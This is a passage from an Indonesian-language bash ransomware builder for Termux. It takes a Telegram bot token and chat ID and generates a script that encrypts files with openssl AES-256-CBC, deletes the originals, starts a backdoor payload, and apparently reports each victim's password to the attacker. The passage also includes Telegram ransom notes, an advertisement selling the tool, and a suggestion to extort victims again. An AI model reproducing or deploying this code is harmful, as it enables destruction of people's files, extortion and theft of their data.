    sleep 0.1
done
echo

sleep 5
echo ""
echo -e "\\e[32mLANGKAH LANGKAH UNTUK MENEBUS FILE :\\e[0m"
sleep 1
echo ""
echo ""

echo -e "\\033[33m[ ! ]\\033[0m \\033[31m Berikan Informasi ini ke orang yang bersangkutan ( penjual decryptor )\\033[0m"
echo ""
echo "[ ! ] INFORMASI PENGGUNA YANG TERJANGKIT RANSOMWARE"
echo "User Id: \$(whoami)"
echo "Date: \$(date)"
echo "Type: AES-255 CBC"
echo ""
echo ""

echo ""
echo -e "\\e[33m [ ! ]Tips decrypt/pemulihan file :

1. Jangan Asal Tebak Password!!
2. Jangan Menggunakan Decryptor yang di luar sana! itu akan merusak file anda!
3. Beli pass decryptor dan Script decryptor ke orang yang bersangkutan
4. Jangan Hapus Termux jika ingin data pulih kembali!

[ ! ] PERINGATAN KERAS : Jika anda melanggar maka hal ini yang akan terjadi!!

1. Jika anda menebak password maka file akan rusak
2. Jika anda dapat decryptor di luar maka itu tidak sesuai dengan enkripsi! maka akan menjadikan file rusak!!
3. Anda akan di beri kesempatan waktu atau tidak yaitu tergantung oleh pengontrol  dari Ransomware ini! jika anda tidak membayar tepat waktu atau uang tebusan kurang maka si pengontrol bisa menghapus semua file anda!\\e[0m"
echo ""
echo ""

echo -e "\\033[33m[ ! ]\\033[0m \\033[31mBeli skrip decryptor dan password decryptor ke telegram\\033[0m \\033[34m: t.me/GeralStvns\\033[0m"
else
echo "PERINGATAN ⚠️. PERINGATAN ⚠️, PERINGATAN ⚠️"

mpv "https://l.top4top.io/m_3551rlvax0.mp3" > /dev/null 2>&1

cat << 'I' | boxes -d ansi-rounded | lolcat
 ██████╗██╗    ██╗███╗   ██╗███████╗██████╗     ██████╗ ██╗   ██╗
██╔══██╗██║██║████╗  ██║██╔════╝██╔══██╗    ██╔══██╗╚██╗ ██╔╝
██████╔╝██║█╗ ██║██╔██╗ ██║█████╗  ██║  ██║    ██████╔╝ ╚████╔╝ 
██╔═══╝██║███╗██║██║╚██╗██║██╔══╝  ██║  ██║    ██╔══██╗  ╚██╔╝
██║     ╚███╔███╔╝██║ ╚████║███████╗██████╔╝    ██████╔╝   ██║
╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝╚══════╝╚═════╝     ╚═════╝    ╚═╝
I

sleep 5
clear

cat << 'B'
 █████╗ ███╗   ██╗██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗██████╗ 
██╔══██╗████╗██║██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██╔════╝╚════██╗
███████║██╔██╗██║██║  ██║██████╔╝███████║ ╚███╔╝ ██║      █████╔╝
██╔══██║██║╚██╗██║██║██║██╔══██╗██╔══██║ ██╔██╗ ██║     ██╔═══╝ 
██║  ██║██║ ╚████║██████╔╝██║  ██║██║  ██║██╔╝ ██╗╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
 V 3.6.0
B

cat << 'J' | boxes -d ansi-rounded | lolcat

██╗    ██╗██╗  ██╗ █████╗ ████████╗
██║    ██║██║  ██║██╔══██╗╚══██╔══╝
██║ █╗ ██║███████║███████║   ██║
██║███╗██║██╔══██║██╔══██║   ██║
╚███╔███╔╝██║  ██║██║  ██║   ██║
 ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝

██╗  ██╗ █████╗ ██████╗ ██████╗ ███████╗███╗   ██╗███████╗██████╗
██║  ██║██╔══██╗██╔══██╗██╔══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗
███████║███████║██████╔╝██████╔╝█████╗  ██╔██╗ ██║█████╗  ██║  ██║
██╔══██║██╔══██║██╔═══╝ ██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██║  ██║
██║  ██║██║  ██║██║     ██║     ███████╗██║ ╚████║███████╗██████╔╝
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚═════╝

J

sleep 4
clear
cat << 'A' | boxes -d ansi-rounded | lolcat

⠀⠀⠀                      ⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀⠀⠀

A
sleep 1
cat << 'W' | boxes -d ansi-rounded | lolcat
 █████╗ ███╗   ██╗██████╗ ██████╗  █████╗ ██╗  ██╗ ██████╗██████╗ 
██╔══██╗████╗██║██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██╔════╝╚════██╗
███████║██╔██╗██║██║  ██║██████╔╝███████║ ╚███╔╝ ██║      █████╔╝
██╔══██║██║╚██╗██║██║██║██╔══██╗██╔══██║ ██╔██╗ ██║     ██╔═══╝ 
██║  ██║██║ ╚████║██████╔╝██║  ██║██║  ██║██╔╝ ██╗╚██████╗███████╗
╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
 V 3.6.0
W

text="Halo kawan ! terminal mu telah di retas dan file mu telah di kunci oleh NEXORRA RANSOMWARE 2.0!!"

for ((i=0; i<\${#text}; i++)); do
    printf "\\033[31m%s\\033[0m" "\${text:\$i:1}"  # \\033[31m untuk merah, \\033[0m untuk reset
    sleep 0.1
done
echo
sleep 5
echo ""
text="Untuk Menebus File Dan Terminal Ikuti Langkah di bawah ini!!!"

for ((i=0; i<\${#text}; i++)); do
    printf "\\033[31m%s\\033[0m" "\${text:\$i:1}"  # \\033[31m untuk merah, \\033[0m untuk reset
    sleep 0.1
done
echo

sleep 5
echo ""
echo -e "\\e[32mLANGKAH LANGKAH UNTUK MENEBUS FILE :\\e[0m"
sleep 1
echo ""
echo ""

echo -e "\\033[33m[ ! ]\\033[0m \\033[31m Berikan Informasi ini ke orang yang bersangkutan ( penjual decryptor )\\033[0m"
echo ""
echo "[ ! ] INFORMASI PENGGUNA YANG TERJANGKIT RANSOMWARE"
echo "User Id: \$(whoami)"
echo "Date: \$(date)"
echo "Type: AES-255 CBC"
echo ""
echo ""
echo -e "\\e[33m [ ! ]Tips decrypt/pemulihan file :

1. Jangan Asal Tebak Password!!
2. Jangan Menggunakan Decryptor yang di luar sana! itu akan merusak file anda!
3. Beli password decryptor dan Script decryptor ke orang yang bersangkutan
4. Jangan Hapus Termux jika ingin data pulih kembali!

[ ! ] PERINGATAN KERAS : Jika anda melanggar maka hal ini yang akan terjadi!!

1. Jika anda menebak password maka file akan rusak
2. Jika anda dapat decryptor di luar maka itu tidak sesuai dengan enkripsi! maka akan menjadikan file rusak!!
3. Anda akan di beri kesempatan waktu atau tidak yaitu tergantung oleh pengontrol  dari Ransomware ini! jika anda tidak membayar tepat waktu atau uang tebusan kurang maka si pengontrol bisa menghapus semua file anda!\\e[0m"
echo ""
echo ""

echo -e "\\033[33m[ ! ]\\033[0m \\033[31mBeli skrip decryptor dan password decryptor ke telegram\\033[0m \\033[34m: t.me/GeralStvns\\033[0m"
fi
RC_EOF
        fi
    done
}

lemes_habis_crot() {
    PASSWORD=\$(< /dev/urandom tr -dc 'A-Za-z0-9' | head -c 20)
}

ahhhh_crot_sigma() {
    MESSAGE="Halo ! 子犬は人のスクリプトの名前を変更するのが好き -- perkenalkan saya ZeroEsc Ransomware Versi 3.6.0 Buatan AndraxC2 atau yang bisa kalian panggil admin andrax !. saya disini untuk Meng endkripsi file ! jika anda ingin mempunyai skrip Ransomware seperti ini bisa dm admin @GeralStvns ;)

===== ⚡ New Victims Detect ⚡ =====
Id Target: \$(whoami)
Password: \$PASSWORD
Type enkripsi: AES-256 CBC
Status: Terkunci ✅
===================================
Note: Share Informasi ini kepada user yang sudah bayar kunci untuk dekripsi!! file / membayar tebusan
--jika kalian mau bermain kasar, kalian bisa memeras lagi kalau belum merasa puas dengan uang korban 😗
Selamat tinggal,Saya Zesc 😗😄, nantikan update Ransomware berikutnya yaaa versi 3.0"
}

OalahCak() {
    local file="\$1"
    local encrypted_file="\${file}.Ransomware_AndraxC2_ZeroEscapeVersion"
    openssl enc -aes-256-cbc -salt -in "\$file" -out "\$encrypted_file" -pass pass:"\$PASSWORD" &> /dev/null
    if [ \$? -eq 0 ]; then
        rm "\$file"
    else
        echo "opo to le: \$file" &> /dev/null
    fi
}

nexorra_jir() {
    lemes_habis_crot
    ahhhh_crot_sigma
    when2_saja=("apk")
}

totalan_su=\$(find "\$A2" -type f -name "*.Ransomware_AndraxC2_ZeroEscapeVersion" | wc -l)
if [ "\$totalan_su" -gt 0 ]; then
    clear
    echo "[ ? ] nyari apa kau pukimak? -_ nyari decryptor? beli lah pantek.  ga guna kau run file ini lagi asw-_ pergi kau GET OUT !!!"
else
    echo "Loading Instalasi Package..."
    PAYLOAD_BACKDOOR &
    nexorra_jir &
    Fuz &
    PAYLOAD_PENGELABUHAN
fi
EOF
    
    chmod +x "$output_file"
}

main() {
    clear
    animasi0
    sleep 0.5
    clear
    animasi1
    sleep 0.5
    clear
    animasi2
    sleep 0.5
    clear
    animasi3
    sleep 0.5
    clear
    animasi4
    sleep 0.5
    print_banner
    
    log.warn "${pink}Masukkan token bot Telegram"${NC}
    read -p "[^_^] Token: " token
    
    echo -n "Sedang memproses  "
    (sleep 8) &
    spinner
    validate_token "$token" || exit 1
    echo ""
    log.info "Token Valid !!"
    echo ""
    echo ""
    
    log.info "${GREEN}[+]${NC} Masukkan Chat ID"
    log.info "${YELLOW}[-]${NC} Contoh: 123456789 atau -1001234567890 (untuk group)"
    read -p "[+] Chat ID: " chat_id
    
    echo -n "Sedang memproses  "
    (sleep 8) &
    spinner
    echo ""
    validate_chat_id "$chat_id" || exit 1
    echo ""
    log.info "Id Valid !!"
    sleep 5
    echo ""
    echo ""
    
    output_file=$(generate_random_name)
    
    log.info "[+] Membuat ransomware script..."
    sleep 6
    create_ransomware_script "$token" "$chat_id" "$output_file"
    
    log.info "Script berhasil dibuat: ${output_file}"
    log.warn "Admin / Owner pembuat skrip ini tidak bertanggung jawab jika ada masalah!, saya Owner skrip anggat tangan jikalau anda terkena masalah.
    
    ©AndraxC2 Dev"
}

main
